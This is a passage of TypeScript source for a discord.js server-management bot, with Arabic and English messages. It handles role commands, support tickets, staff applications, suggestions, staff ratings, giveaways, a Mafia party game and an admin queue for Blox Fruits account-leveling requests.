        const targetUserId = interaction.options.getString('user_id')!;

        const targetGuild = client.guilds.cache.get(targetGuildId);
        if (!targetGuild) return interaction.reply({ content: "❌ البوت ليس موجوداً في هذا السيرفر.", ephemeral: true });

        await interaction.deferReply();
        try {
          await targetGuild.members.unban(targetUserId);
          await interaction.editReply(`✅ تم فك البان عن <@${targetUserId}> في سيرفر **${targetGuild.name}**.`);
        } catch (error: any) {
          await interaction.editReply({ content: `❌ فشل فك البان: ${error.message}` });
        }
      }

      if (commandName === 'botinfo') {
        const uptime = process.uptime();
        const days = Math.floor(uptime / 86400);
        const hours = Math.floor(uptime / 3600) % 24;
        const minutes = Math.floor(uptime / 60) % 60;
        const seconds = Math.floor(uptime % 60);

        const embed = new EmbedBuilder()
          .setTitle('🥀 Requiem Information')
          .setColor('#8B0000') // Dark Red for the 'bloody elegance' theme
          .setThumbnail(client.user?.displayAvatarURL() || null)
          .setDescription("A masterpiece of power and elegance. Orchestrating the end of old worlds and the birth of new ones.")
          .addFields(
            { name: '📌 Name', value: `${client.user?.tag}`, inline: true },
            { name: '🆔 ID', value: `${client.user?.id}`, inline: true },
            { name: '📅 Created At', value: `<t:${Math.floor(client.user!.createdTimestamp / 1000)}:R>`, inline: true },
            { name: '📚 Library', value: 'discord.js', inline: true },
            { name: '🔢 Version', value: '1.0.0', inline: true },
            { name: '🌐 Servers', value: `${client.guilds.cache.size}`, inline: true },
            { name: '👥 Users', value: `${client.users.cache.size}`, inline: true },
            { name: '⏳ Uptime', value: `${days}d ${hours}h ${minutes}m ${seconds}s`, inline: true },
            { name: '⚡ Latency', value: `${client.ws.ping}ms`, inline: true }
          )
          .setFooter({ text: `Requested by ${interaction.user.tag}`, iconURL: interaction.user.displayAvatarURL() })
          .setTimestamp();

        await interaction.reply({ embeds: [embed] });
      }

      if (commandName === 'add-role') {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.ManageRoles)) {
          return interaction.reply({ content: "❌ You need 'Manage Roles' permission to use this command.", ephemeral: true });
        }

        const user = interaction.options.getUser('user', true);
        const role = interaction.options.getRole('role', true);
        const member = await interaction.guild?.members.fetch(user.id).catch(() => null);

        if (!member) {
          return interaction.reply({ content: "❌ User not found in this server.", ephemeral: true });
        }

        const botMember = await interaction.guild?.members.fetch(client.user!.id);
        if (botMember && role.position >= botMember.roles.highest.position) {
          return interaction.reply({ content: "❌ I cannot assign this role because it is higher than or equal to my highest role.", ephemeral: true });
        }

        try {
          await member.roles.add(role.id);
          await interaction.reply({ content: `✅ Successfully added the role **${role.name}** to **${user.tag}**.` });
        } catch (err) {
          console.error("Error adding role:", err);
          await interaction.reply({ content: "❌ Failed to add the role. Make sure I have enough permissions and my role is above the target role.", ephemeral: true });
        }
      }

      if (commandName === 'remove-role') {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.ManageRoles)) {
          return interaction.reply({ content: "❌ You need 'Manage Roles' permission to use this command.", ephemeral: true });
        }

        const user = interaction.options.getUser('user', true);
        const role = interaction.options.getRole('role', true);
        const member = await interaction.guild?.members.fetch(user.id).catch(() => null);

        if (!member) {
          return interaction.reply({ content: "❌ User not found in this server.", ephemeral: true });
        }

        const botMember = await interaction.guild?.members.fetch(client.user!.id);
        if (botMember && role.position >= botMember.roles.highest.position) {
          return interaction.reply({ content: "❌ I cannot remove this role because it is higher than or equal to my highest role.", ephemeral: true });
        }

        try {
          await member.roles.remove(role.id);
          await interaction.reply({ content: `✅ Successfully removed the role **${role.name}** from **${user.tag}**.` });
        } catch (err) {
          console.error("Error removing role:", err);
          await interaction.reply({ content: "❌ Failed to remove the role. Make sure I have enough permissions and my role is above the target role.", ephemeral: true });
        }
      }

      if (commandName === 'list-roles') {
        const user = interaction.options.getUser('user', true);
        const member = await interaction.guild?.members.fetch(user.id).catch(() => null);

        if (!member) {
          return interaction.reply({ content: "❌ User not found in this server.", ephemeral: true });
        }

        const roles = member.roles.cache
          .filter(role => role.name !== '@everyone')
          .map(role => `<@&${role.id}>`)
          .join(', ');

        const embed = new EmbedBuilder()
          .setTitle(`Roles for ${user.username}`)
          .setDescription(roles || "No roles assigned.")
          .setColor(0x5865F2)
          .setThumbnail(user.displayAvatarURL())
          .setTimestamp();

        await interaction.reply({ embeds: [embed] });
      }

      if (commandName === 'set-ticket-role') {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "You need Administrator permissions.", ephemeral: true });
        }
        const category = interaction.options.getString('category', true);
        const role = interaction.options.getRole('role', true);
        db.prepare("INSERT OR REPLACE INTO ticket_categories (guildId, categoryName, roleId) VALUES (?, ?, ?)").run(guild.id, category, role.id);
        await interaction.reply({ content: `✅ Staff role for **${category}** set to ${role}.`, ephemeral: true });
      }

      if (commandName === 'apply-settings') {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "❌ هذا الأمر للمسؤولين فقط.", ephemeral: true });
        }
        const channel = interaction.options.getChannel('channel', true);
        const role = interaction.options.getRole('role', true);
        const staffRole = interaction.options.getRole('staff_role', true);
        const imageUrl = interaction.options.getString('image');
        const questionsStr = interaction.options.getString('questions');

        let questionsJson = null;
        if (questionsStr) {
          const questions = questionsStr.split(',').map(q => q.trim()).filter(q => q.length > 0).slice(0, 5);
          questionsJson = JSON.stringify(questions);
        }

        db.prepare("INSERT OR REPLACE INTO apply_settings (guildId, channelId, roleId, staffRoleId, imageUrl, questions, enabled) VALUES (?, ?, ?, ?, ?, ?, ?)").run(guild.id, channel.id, role.id, staffRole.id, imageUrl, questionsJson, 1);
        await interaction.reply({ content: `✅ تم حفظ إعدادات التقديم:\n- القناة: ${channel}\n- الرتبة: ${role}\n- رتبة الإدارة: ${staffRole}${imageUrl ? `\n- الصورة: [رابط](${imageUrl})` : ''}${questionsStr ? `\n- الأسئلة: ${questionsStr}` : ''}`, ephemeral: true });
      }

      if (commandName === 'setup-apply') {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "❌ هذا الأمر للمسؤولين فقط.", ephemeral: true });
        }
        const settings = db.prepare("SELECT * FROM apply_settings WHERE guildId = ?").get(guild.id) as any;
        if (!settings) {
          return interaction.reply({ content: "❌ يرجى ضبط الإعدادات أولاً باستخدام `/apply-settings`.", ephemeral: true });
        }

        const embed = new EmbedBuilder()
          .setTitle("📝 التقديم على الإدارة / الرتب")
          .setDescription("إذا كنت ترغب في الانضمام إلى فريقنا أو الحصول على رتبة معينة، اضغط على الزر أدناه للتقديم.")
          .setColor(0x00FF00)
          .setFooter({ text: guild.name, iconURL: guild.iconURL() || undefined });

        if (settings.imageUrl) {
          embed.setImage(settings.imageUrl);
        }

        const row = new ActionRowBuilder<ButtonBuilder>().addComponents(
          new ButtonBuilder()
            .setCustomId('apply_now')
            .setLabel('تقديم الآن')
            .setStyle(ButtonStyle.Primary)
            .setEmoji('📝')
        );

        await interaction.channel?.send({ embeds: [embed], components: [row] });
        await interaction.reply({ content: "✅ تم إرسال رسالة التقديم.", ephemeral: true });
      }

      if (commandName === 'suggest-settings') {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "❌ هذا الأمر للمسؤولين فقط.", ephemeral: true });
        }
        const channel = interaction.options.getChannel('channel', true);
        db.prepare("INSERT OR REPLACE INTO suggestion_settings (guildId, channelId, enabled) VALUES (?, ?, ?)").run(guild.id, channel.id, 1);
        await interaction.reply({ content: `✅ تم تحديد قناة الاقتراحات: ${channel}`, ephemeral: true });
      }

      if (commandName === 'suggest') {
        const settings = db.prepare("SELECT * FROM suggestion_settings WHERE guildId = ?").get(guild.id) as any;
        if (!settings) return interaction.reply({ content: "❌ لم يتم إعداد نظام الاقتراحات في هذا السيرفر.", ephemeral: true });
        
        const channel = guild.channels.cache.get(settings.channelId) as any;
        if (!channel) return interaction.reply({ content: "❌ قناة الاقتراحات غير موجودة.", ephemeral: true });

        const suggestion = interaction.options.getString('suggestion', true);
        const embed = new EmbedBuilder()
          .setAuthor({ name: user.tag, iconURL: user.displayAvatarURL() })
          .setTitle("💡 اقتراح جديد")
          .setDescription(suggestion)
          .setColor(0xFFFF00)
          .setTimestamp();

        const msg = await channel.send({ embeds: [embed] });
        await msg.react('✅');
        await msg.react('❌');

        await interaction.reply({ content: "✅ تم إرسال اقتراحك بنجاح!", ephemeral: true });
      }

      if (commandName === 'eval-settings') {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "❌ هذا الأمر للمسؤولين فقط.", ephemeral: true });
        }
        const channel = interaction.options.getChannel('channel', true);
        db.prepare("INSERT OR REPLACE INTO evaluation_settings (guildId, channelId, enabled) VALUES (?, ?, ?)").run(guild.id, channel.id, 1);
        await interaction.reply({ content: `✅ تم تحديد قناة التقييمات: ${channel}`, ephemeral: true });
      }

      if (commandName === 'rate-staff') {
        const settings = db.prepare("SELECT * FROM evaluation_settings WHERE guildId = ?").get(guild.id) as any;
        if (!settings) return interaction.reply({ content: "❌ لم يتم إعداد نظام التقييم في هذا السيرفر.", ephemeral: true });

        const channel = guild.channels.cache.get(settings.channelId) as any;
        if (!channel) return interaction.reply({ content: "❌ قناة التقييمات غير موجودة.", ephemeral: true });

        const staff = interaction.options.getUser('staff', true);
        const rating = interaction.options.getInteger('rating', true);
        const feedback = interaction.options.getString('feedback') || "لا يوجد";

        const stars = "⭐".repeat(rating);
        const embed = new EmbedBuilder()
          .setTitle("⭐ تقييم إداري جديد")
          .addFields(
            { name: "الإداري", value: `${staff} (${staff.tag})`, inline: true },
            { name: "التقييم", value: stars, inline: true },
            { name: "المقيم", value: `${user} (${user.tag})`, inline: true },
            { name: "الملاحظات", value: feedback }
          )
          .setColor(0x00FF00)
          .setTimestamp();

        await channel.send({ embeds: [embed] });
        db.prepare("INSERT INTO evaluations (guildId, userId, staffId, rating, feedback) VALUES (?, ?, ?, ?, ?)").run(guild.id, user.id, staff.id, rating, feedback);

        await interaction.reply({ content: `✅ تم إرسال تقييمك لـ **${staff.tag}** بنجاح!`, ephemeral: true });
      }

      if (commandName === 'list') {
        const listName = interaction.options.getString('name');
        if (listName) {
          const list = db.prepare("SELECT * FROM custom_lists WHERE guildId = ? AND title = ?").get(guild.id, listName) as any;
          if (!list) return interaction.reply({ content: "❌ لم يتم العثور على قائمة بهذا الاسم.", ephemeral: true });

          const content = JSON.parse(list.content);
          const embed = new EmbedBuilder()
            .setTitle(`📋 ${list.title}`)
            .setDescription(content.join('\n'))
            .setColor(0x5865F2)
            .setTimestamp();
          
          return interaction.reply({ embeds: [embed] });
        } else {
          const lists = db.prepare("SELECT title FROM custom_lists WHERE guildId = ?").all(guild.id) as any[];
          if (lists.length === 0) return interaction.reply({ content: "❌ لا توجد قوائم مخصصة في هذا السيرفر.", ephemeral: true });

          const embed = new EmbedBuilder()
            .setTitle("📋 القوائم المخصصة")
            .setDescription(lists.map(l => `• ${l.title}`).join('\n'))
            .setColor(0x5865F2)
            .setTimestamp();
          
          return interaction.reply({ embeds: [embed] });
        }
      }

      return;
    }

    if (interaction.isModalSubmit()) {
      if (interaction.customId === 'apply_modal') {
        const settings = db.prepare("SELECT * FROM apply_settings WHERE guildId = ?").get(interaction.guildId) as any;
        if (!settings) return interaction.reply({ content: "❌ لم يتم العثور على إعدادات التقديم.", ephemeral: true });

        const staffChannel = interaction.guild?.channels.cache.get(settings.channelId) as any;
        if (!staffChannel) return interaction.reply({ content: "❌ لم يتم العثور على قناة الإدارة.", ephemeral: true });

        const questions = settings.questions ? JSON.parse(settings.questions) : ["الاسم", "العمر", "الخبرة السابقة", "لماذا تريد الانضمام؟"];
        const answers: any = {};
        const embed = new EmbedBuilder()
          .setTitle("📝 تقديم جديد")
          .addFields({ name: "المقدم", value: `${interaction.user} (${interaction.user.tag})`, inline: false })
          .setColor(0x00FFFF)
          .setTimestamp();

        questions.forEach((q: string, i: number) => {
          const answer = interaction.fields.getTextInputValue(`q_${i}`);
          answers[q] = answer;
          embed.addFields({ name: q, value: answer || "لا يوجد" });
        });

        const row = new ActionRowBuilder<ButtonBuilder>().addComponents(
          new ButtonBuilder().setCustomId(`accept_app_${interaction.user.id}`).setLabel('قبول').setStyle(ButtonStyle.Success),
          new ButtonBuilder().setCustomId(`reject_app_${interaction.user.id}`).setLabel('رفض').setStyle(ButtonStyle.Danger)
        );

        await staffChannel.send({ embeds: [embed], components: [row] });
        db.prepare("INSERT INTO applications (guildId, userId, status, answers) VALUES (?, ?, ?, ?)").run(interaction.guildId, interaction.user.id, 'pending', JSON.stringify(answers));

        await interaction.reply({ content: "✅ تم إرسال تقديمك بنجاح! سيتم مراجعته من قبل الإدارة.", ephemeral: true });
      }
      return;
    }

  if (interaction.isButton()) {
    const game = mafiaGames.get(interaction.guildId || "");
    if (game) {
      const player = game.players.find(p => p.id === interaction.user.id);
      if (interaction.customId === "mafia_show_role") {
        if (!player) return interaction.reply({ content: "❌ أنت لست في هذه اللعبة.", ephemeral: true });
        let roleDesc = "";
        if (player.role === 'mafia') roleDesc = "أنت **المافيا**! هدفك هو قتل الجميع دون أن يتم كشفك.";
        if (player.role === 'doctor') roleDesc = "أنت **الطبيب**! يمكنك حماية شخص واحد كل ليلة.";
        if (player.role === 'detective') roleDesc = "أنت **المحقق**! يمكنك التحقق من هوية شخص واحد كل ليلة.";
        if (player.role === 'citizen') roleDesc = "أنت **مواطن**! حاول كشف المافيا والتصويت ضدهم.";
        return interaction.reply({ content: `🎭 دورك هو: **${player.role.toUpperCase()}**\n${roleDesc}`, ephemeral: true });
      }

      if (interaction.customId.startsWith("mafia_action_")) {
        if (!player || !player.isAlive) return interaction.reply({ content: "❌ لا يمكنك القيام بهذا الفعل.", ephemeral: true });
        if (game.phase !== 'night') return interaction.reply({ content: "❌ هذه المهمة متاحة في الليل فقط.", ephemeral: true });

        const alivePlayers = game.players.filter(p => p.isAlive);
        
        if (interaction.customId === "mafia_action_mafia") {
          if (player.role !== 'mafia') return interaction.reply({ content: "❌ هذا الزر مخصص للمافيا فقط.", ephemeral: true });
          const options = alivePlayers.filter(p => p.id !== player.id).map(p => new StringSelectMenuOptionBuilder().setLabel(p.tag).setValue(p.id));
          const select = new StringSelectMenuBuilder().setCustomId("mafia_kill").setPlaceholder("اختر ضحيتك").addOptions(options);
          const row = new ActionRowBuilder<StringSelectMenuBuilder>().addComponents(select);
          return interaction.reply({ content: "🔪 اختر الشخص الذي تريد قتله الليلة:", components: [row], ephemeral: true });
        }

        if (interaction.customId === "mafia_action_doctor") {
          if (player.role !== 'doctor') return interaction.reply({ content: "❌ هذا الزر مخصص للطبيب فقط.", ephemeral: true });
          const options = alivePlayers.map(p => new StringSelectMenuOptionBuilder().setLabel(p.tag).setValue(p.id));
          const select = new StringSelectMenuBuilder().setCustomId("mafia_save").setPlaceholder("اختر شخصاً لحمايته").addOptions(options);
          const row = new ActionRowBuilder<StringSelectMenuBuilder>().addComponents(select);
          return interaction.reply({ content: "🧪 اختر الشخص الذي تريد حمايته الليلة:", components: [row], ephemeral: true });
        }

        if (interaction.customId === "mafia_action_detective") {
          if (player.role !== 'detective') return interaction.reply({ content: "❌ هذا الزر مخصص للمحقق فقط.", ephemeral: true });
          const options = alivePlayers.filter(p => p.id !== player.id).map(p => new StringSelectMenuOptionBuilder().setLabel(p.tag).setValue(p.id));
          const select = new StringSelectMenuBuilder().setCustomId("mafia_check").setPlaceholder("اختر شخصاً للتحقق منه").addOptions(options);
          const row = new ActionRowBuilder<StringSelectMenuBuilder>().addComponents(select);
          return interaction.reply({ content: "🔍 اختر الشخص الذي تريد التحقق من هويته الليلة:", components: [row], ephemeral: true });
        }
      }
    }
  }

  if (interaction.isStringSelectMenu()) {
    const game = mafiaGames.get(interaction.guildId || "");
    if (game) {
      if (interaction.customId === "mafia_kill") {
        game.nightActions.mafiaTarget = interaction.values[0];
        await interaction.reply({ content: "✅ تم اختيار الهدف.", ephemeral: true });
        return;
      }
      if (interaction.customId === "mafia_save") {
        game.nightActions.doctorTarget = interaction.values[0];
        await interaction.reply({ content: "✅ تم اختيار الشخص لحمايته.", ephemeral: true });
        return;
      }
      if (interaction.customId === "mafia_check") {
        const target = game.players.find(p => p.id === interaction.values[0]);
        await interaction.reply({ content: `🔍 نتيجة التحقق: **${target?.tag}** هو **${target?.role === 'mafia' ? 'مافيا' : 'مواطن'}**.`, ephemeral: true });
        return;
      }
      if (interaction.customId === "mafia_vote") {
        if (!game.players.find(p => p.id === interaction.user.id && p.isAlive)) {
          return interaction.reply({ content: "❌ لا يمكنك التصويت وأنت ميت أو لست في اللعبة.", ephemeral: true });
        }
        game.votes.set(interaction.user.id, interaction.values[0]);
        await interaction.reply({ content: "✅ تم تسجيل صوتك.", ephemeral: true });
        return;
      }
    }
  }

  if (interaction.isButton() && interaction.customId === "open_ticket") {
    const guild = interaction.guild;
    if (!guild) return;

    // Defer reply immediately as channel creation can be slow
    await interaction.deferReply({ ephemeral: true }).catch(console.error);

    // Permission Check
    if (!guild.members.me?.permissions.has([PermissionFlagsBits.ManageChannels, PermissionFlagsBits.ManageRoles])) {
      return interaction.editReply({ content: "I don't have the 'Manage Channels' and 'Manage Roles' permissions to create a ticket!" }).catch(console.error);
    }

    // Check if user already has an open ticket
    const existingTicket = db.prepare("SELECT * FROM tickets WHERE userId = ? AND status = 'open'").get(interaction.user.id);
    if (existingTicket) {
      return interaction.editReply({ content: "You already have an open ticket!" }).catch(console.error);
    }

    try {
      const botMember = guild.members.me;
      if (!botMember) return;

      // Fetch support role
      const supportRole = db.prepare("SELECT supportRoleId FROM ticket_settings WHERE guildId = ?").get(guild.id) as { supportRoleId: string } | undefined;

      const permissionOverwrites: any[] = [
        {
          id: guild.id,
          deny: [PermissionFlagsBits.ViewChannel],
        },
        {
          id: interaction.user.id,
          allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages, PermissionFlagsBits.ReadMessageHistory],
        },
        {
          id: botMember.id,
          allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages, PermissionFlagsBits.ReadMessageHistory, PermissionFlagsBits.ManageChannels],
        },
      ];

      if (supportRole) {
        permissionOverwrites.push({
          id: supportRole.supportRoleId,
          allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages, PermissionFlagsBits.ReadMessageHistory],
        });
      }

      const channel = await guild.channels.create({
        name: `ticket-${interaction.user.username}`,
        type: ChannelType.GuildText,
        permissionOverwrites,
      });

      db.prepare("INSERT INTO tickets (userId, channelId, status) VALUES (?, ?, 'open')").run(interaction.user.id, channel.id);

      const embed = new EmbedBuilder()
        .setTitle("Ticket Created")
        .addFields(
          { name: "User", value: `${interaction.user}`, inline: true },
          { name: "Category", value: "General", inline: true }
        )
        .setDescription(`Hello ${interaction.user}, our support team will be with you shortly.\nUse \`.close\` to close this ticket.`)
        .setColor(0x00FF00)
        .setTimestamp();

      const actionRow = new ActionRowBuilder<ButtonBuilder>().addComponents(
        new ButtonBuilder()
          .setCustomId("claim_ticket")
          .setLabel("Claim Ticket")
          .setStyle(ButtonStyle.Primary),
        new ButtonBuilder()
          .setCustomId("close_ticket")
          .setLabel("Close Ticket")
          .setStyle(ButtonStyle.Danger)
      );

      await channel.send({ content: supportRole ? `<@&${supportRole.supportRoleId}>` : "Support team notified.", embeds: [embed], components: [actionRow] }).catch(console.error);
      await interaction.editReply({ content: `Ticket created: ${channel}` }).catch(console.error);
    } catch (err) {
      console.error("Error creating ticket channel:", err);
      await interaction.editReply({ content: "Failed to create a ticket channel. Please check my permissions." }).catch(console.error);
    }
    return;
  }

  if (interaction.isButton() && interaction.customId === "join_giveaway") {
    const giveaway = db.prepare("SELECT * FROM giveaways WHERE messageId = ? AND status = 'active'").get(interaction.message.id) as any;
    if (!giveaway) return interaction.reply({ content: "❌ هذه المسابقة انتهت أو غير موجودة.", ephemeral: true });
    
    try {
      db.prepare("INSERT INTO giveaway_participants (messageId, userId) VALUES (?, ?)").run(interaction.message.id, interaction.user.id);
      await interaction.reply({ content: "✅ تم تسجيلك في المسابقة!", ephemeral: true });
    } catch (e) {
      await interaction.reply({ content: "❌ أنت مسجل بالفعل في المسابقة.", ephemeral: true });
    }
    return;
  }

  if (!interaction.isButton()) return;

  if (interaction.customId === 'blox_view_logs') {
    if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) return;
    const logs = db.prepare("SELECT * FROM blox_logs ORDER BY id DESC LIMIT 20").all() as any[];
    if (logs.length === 0) return interaction.reply({ content: "❌ لا توجد سجلات حالياً.", ephemeral: true });

    const logText = logs.map(l => `[ID: ${l.requestId}] ${l.message}`).join('\n');
    const embed = new EmbedBuilder()
      .setTitle("📜 سجلات التلفيل (Logs)")
      .setDescription(`\`\`\`\n${logText.substring(0, 4000)}\n\`\`\``)
      .setColor(0x5865F2);
    
    return interaction.reply({ embeds: [embed], ephemeral: true });
  }

  if (interaction.customId.startsWith('blox_start_')) {
    if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) return;
    const requestId = interaction.customId.split('_').pop();
    db.prepare("UPDATE blox_fruits_requests SET status = 'processing' WHERE id = ?").run(requestId);
    db.prepare("INSERT INTO blox_logs (requestId, message) VALUES (?, ?)").run(requestId, "🚀 بدأ التلفيل التلقائي للحساب");
    return interaction.update({ content: `✅ تم بدء التلفيل للطلب #${requestId}.`, embeds: [], components: [] });
  }

  if (interaction.customId.startsWith('blox_complete_') || interaction.customId.startsWith('blox_fail_')) {
    if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
      return interaction.reply({ content: "❌ هذا الفعل للمسؤولين فقط.", ephemeral: true });
    }

    const isComplete = interaction.customId.startsWith('blox_complete_');
    const requestId = interaction.customId.split('_').pop();
    const newStatus = isComplete ? 'completed' : 'failed';

    try {
      const request = db.prepare("SELECT * FROM blox_fruits_requests WHERE id = ?").get(requestId) as any;
      if (!request) return interaction.reply({ content: "❌ لم يتم العثور على الطلب.", ephemeral: true });

      db.prepare("UPDATE blox_fruits_requests SET status = ? WHERE id = ?").run(newStatus, requestId);

      const user = await client.users.fetch(request.userId).catch(() => null);
      if (user) {
        const statusMsg = isComplete ? "✅ تم الانتهاء من تلفيل حسابك بنجاح!" : "❌ نعتذر، فشلت عملية تلفيل حسابك. يرجى التواصل مع الإدارة.";
        await user.send(statusMsg).catch(() => null);
      }

      await interaction.update({ content: `✅ تم تحديث حالة الطلب #${requestId} إلى **${newStatus}**.`, embeds: [], components: [] });
    } catch (err) {
      console.error("Error updating blox request status:", err);
      await interaction.reply({ content: "❌ حدث خطأ أثناء تحديث الحالة.", ephemeral: true });
    }
    return;
  }

  if (interaction.customId === 'apply_now') {
    const settings = db.prepare("SELECT * FROM apply_settings WHERE guildId = ?").get(interaction.guildId) as any;
    if (!settings) return interaction.reply({ content: "❌ لم يتم ضبط إعدادات التقديم لهذا السيرفر.", ephemeral: true });

    const modal = new ModalBuilder()
      .setCustomId('apply_modal')
      .setTitle('نموذج التقديم');

    const questions = settings.questions ? JSON.parse(settings.questions) : ["الاسم", "العمر", "الخبرة السابقة", "لماذا تريد الانضمام؟"];
    
    const rows = questions.map((q: string, i: number) => {
      const input = new TextInputBuilder()
        .setCustomId(`q_${i}`)
        .setLabel(q.length > 45 ? q.substring(0, 42) + "..." : q)
        .setStyle(q.length > 20 ? TextInputStyle.Paragraph : TextInputStyle.Short)
        .setRequired(true);
      return new ActionRowBuilder<TextInputBuilder>().addComponents(input);
    });

    modal.addComponents(...rows);

    await interaction.showModal(modal);
    return;
  }

  if (interaction.customId.startsWith('accept_app_')) {
    const applicantId = interaction.customId.split('_')[2];
    const settings = db.prepare("SELECT * FROM apply_settings WHERE guildId = ?").get(interaction.guildId) as any;
    
    if (!settings) return interaction.reply({ content: "❌ لم يتم العثور على إعدادات التقديم.", ephemeral: true });

    if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator) && !(interaction.member?.roles as any).cache.has(settings.staffRoleId)) {
      return interaction.reply({ content: "❌ هذا الزر للإدارة فقط.", ephemeral: true });
    }

    const member = await interaction.guild?.members.fetch(applicantId).catch(() => null);
    if (member) {
      await member.roles.add(settings.roleId).catch(console.error);
      await member.send(`✅ تهانينا! تم قبول تقديمك في سيرفر **${interaction.guild?.name}** وتم منحك الرتبة.`).catch(() => {});
    }

    db.prepare("UPDATE applications SET status = 'accepted' WHERE guildId = ? AND userId = ?").run(interaction.guildId, applicantId);

    const embed = EmbedBuilder.from(interaction.message.embeds[0]);
    embed.setColor(0x00FF00).setTitle("✅ تم قبول التقديم");
    await interaction.update({ embeds: [embed], components: [] });
    return;
  }

  if (interaction.customId.startsWith('reject_app_')) {
    const applicantId = interaction.customId.split('_')[2];
    const settings = db.prepare("SELECT * FROM apply_settings WHERE guildId = ?").get(interaction.guildId) as any;

    if (!settings) return interaction.reply({ content: "❌ لم يتم العثور على إعدادات التقديم.", ephemeral: true });

    if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator) && !(interaction.member?.roles as any).cache.has(settings.staffRoleId)) {
      return interaction.reply({ content: "❌ هذا الزر للإدارة فقط.", ephemeral: true });
    }

    const member = await interaction.guild?.members.fetch(applicantId).catch(() => null);
    if (member) {
      await member.send(`❌ للأسف، تم رفض تقديمك في سيرفر **${interaction.guild?.name}**.`).catch(() => {});
    }

    db.prepare("UPDATE applications SET status = 'rejected' WHERE guildId = ? AND userId = ?").run(interaction.guildId, applicantId);

    const embed = EmbedBuilder.from(interaction.message.embeds[0]);
    embed.setColor(0xFF0000).setTitle("❌ تم رفض التقديم");
    await interaction.update({ embeds: [embed], components: [] });
    return;
  }

  if (interaction.customId === "mafia_join") {
    const game = mafiaGames.get(interaction.guildId || "");
    if (!game || game.phase !== 'join') return interaction.reply({ content: "❌ لا توجد فترة انضمام حالياً.", ephemeral: true });
    
    if (game.players.find(p => p.id === interaction.user.id)) {
      return interaction.reply({ content: "❌ أنت منضم بالفعل.", ephemeral: true });
    }

    await interaction.deferUpdate().catch(() => {});

    game.players.push({
      id: interaction.user.id,
      tag: interaction.user.tag,
      role: 'citizen',
      isAlive: true
    });

    const embed = EmbedBuilder.from(interaction.message.embeds[0]);
    embed.setDescription(`اللاعبون المنضمون (${game.players.length}):\n${game.players.map(p => `- ${p.tag}`).join("\n")}`);
    
    await interaction.editReply({ embeds: [embed] });
    return;
  }

  if (interaction.customId === "mafia_start_game") {
    const game = mafiaGames.get(interaction.guildId || "");
    if (!game || game.phase !== 'join') return interaction.reply({ content: "❌ لا يمكن بدء اللعبة الآن.", ephemeral: true });
    
    if (game.players.length < 4) {
      return interaction.reply({ content: "❌ نحتاج إلى 4 لاعبين على الأقل للبدء.", ephemeral: true });
    }

    await interaction.deferUpdate().catch(() => {});

    // Assign Roles
    const players = [...game.players];
    const mafiaIdx = Math.floor(Math.random() * players.length);
    players[mafiaIdx].role = 'mafia';
    
    let doctorIdx;
    do { doctorIdx = Math.floor(Math.random() * players.length); } while (doctorIdx === mafiaIdx);
    players[doctorIdx].role = 'doctor';

    let detectiveIdx;
    do { detectiveIdx = Math.floor(Math.random() * players.length); } while (detectiveIdx === mafiaIdx || detectiveIdx === doctorIdx);
    players[detectiveIdx].role = 'detective';

    game.phase = 'night';
    
    // Show roles via button
    const roleRow = new ActionRowBuilder<ButtonBuilder>().addComponents(
      new ButtonBuilder().setCustomId("mafia_show_role").setLabel("كشف هويتي").setStyle(ButtonStyle.Primary)
    );

    await interaction.editReply({ 
      content: "🎭 بدأت اللعبة! اضغط على الزر أدناه لمعرفة هويتك.", 
      embeds: [], 
      components: [roleRow] 
    });
    
    // Wait 5 seconds before starting night phase
    setTimeout(() => {
      startNightPhase(game);
    }, 5000);
    return;
  }

  if (interaction.customId === "close_ticket") {
    const channel = interaction.channel;
    if (!channel || channel.type !== ChannelType.GuildText) return;

    if (!interaction.guild?.members.me?.permissions.has(PermissionFlagsBits.ManageChannels)) {
      return interaction.reply({ content: "I don't have permission to delete this channel!", ephemeral: true }).catch(console.error);
    }

    try {
      db.prepare("UPDATE tickets SET status = 'closed' WHERE channelId = ?").run(channel.id);
      await interaction.reply("Closing ticket in 5 seconds...").catch(console.error);
      setTimeout(() => channel.delete().catch(console.error), 5000);
    } catch (err) {
      console.error("Error closing ticket:", err);
    }
  }

  if (interaction.customId === "claim_ticket") {
    const channel = interaction.channel;
    if (!channel || channel.type !== ChannelType.GuildText) return;

    await interaction.deferUpdate().catch(() => {});

    try {
      const ticket = db.prepare("SELECT * FROM tickets WHERE channelId = ?").get(channel.id) as any;
      if (!ticket) return interaction.editReply({ content: "Ticket not found in database." });

      if (ticket.staffId) {
        return interaction.editReply({ content: `This ticket has already been claimed by <@${ticket.staffId}>.` });
      }

      // Check if user has permission to claim (either Admin or the specific category role)
      const categoryRole = db.prepare("SELECT roleId FROM ticket_categories WHERE guildId = ? AND categoryName = ?").get(interaction.guildId, ticket.category) as { roleId: string } | undefined;
      
      const isStaff = interaction.memberPermissions?.has(PermissionFlagsBits.Administrator) || 
                      (categoryRole && (interaction.member?.roles as any).cache.has(categoryRole.roleId));

      if (!isStaff) {
        return interaction.editReply({ content: "You do not have permission to claim this ticket." });
      }

      db.prepare("UPDATE tickets SET staffId = ? WHERE channelId = ?").run(interaction.user.id, channel.id);
      
      const embed = EmbedBuilder.from(interaction.message.embeds[0]);
      embed.addFields({ name: "Claimed By", value: `${interaction.user}`, inline: true });
      
      // Disable claim button
      const row = ActionRowBuilder.from(interaction.message.components[0] as any) as ActionRowBuilder<ButtonBuilder>;
      row.components[0].setDisabled(true).setLabel("Claimed");

      await interaction.editReply({ embeds: [embed], components: [row] });
      await channel.send(`✅ Ticket claimed by ${interaction.user}.`);
    } catch (err) {
